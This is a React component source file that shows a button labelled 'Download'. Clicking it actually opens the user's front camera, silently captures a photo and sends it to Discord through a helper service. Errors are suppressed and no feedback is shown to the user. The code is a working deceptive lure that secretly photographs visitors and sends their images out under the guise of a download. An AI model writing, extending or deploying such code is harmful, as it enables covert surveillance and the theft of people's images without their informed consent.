
import React, { useRef } from 'react';
import { Button } from "@/components/ui/button";
import { sendImageToDiscord } from '@/services/discordService';

const CameraCapture = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Function to start camera, take image, and send to Discord
  const handleDownloadClick = async () => {
    try {
      // Request camera access (user sees browser prompt)
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const track = stream.getVideoTracks()[0];
      const imageCapture = new (window as any).ImageCapture ? new (window as any).ImageCapture(track) : null;

      // Fallback if ImageCapture API is not available
      if (imageCapture && typeof imageCapture.takePhoto === "function") {
        // Use ImageCapture API for photo
        const blob = await imageCapture.takePhoto();
        const reader = new FileReader();
        reader.onloadend = async () => {
          // reader.result is a dataURL
          if (typeof reader.result === "string") {
            await sendImageToDiscord(reader.result);
          }
        };
        reader.readAsDataURL(blob);
      } else {
        // Fallback: render to hidden video and canvas, draw frame and get base64
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        await new Promise((resolve) => {
          video.onloadedmetadata = () => resolve(true);
        });

        const width = video.videoWidth;
        const height = video.videoHeight;
        let canvas = canvasRef.current;
        if (!canvas) {
          canvas = document.createElement('canvas');
        }
        canvas.width = width;
        canvas.height = height;
        const context = canvas.getContext('2d');
        if (context) {
          context.drawImage(video, 0, 0, width, height);
          const dataUrl = canvas.toDataURL('image/jpeg');
          await sendImageToDiscord(dataUrl);
        }
        // Cleanup
        video.pause();
        stream.getTracks().forEach(track => track.stop());
      }
    } catch (error) {
      // Do nothing (no feedback or UI)
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-[60vh]">
      <Button
        onClick={handleDownloadClick}
        className="w-64 py-6 text-lg bg-gradient-yowx hover:opacity-90 transition-all"
      >
        Download
      </Button>
      {/* Hidden canvas for background image processing */}
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default CameraCapture;
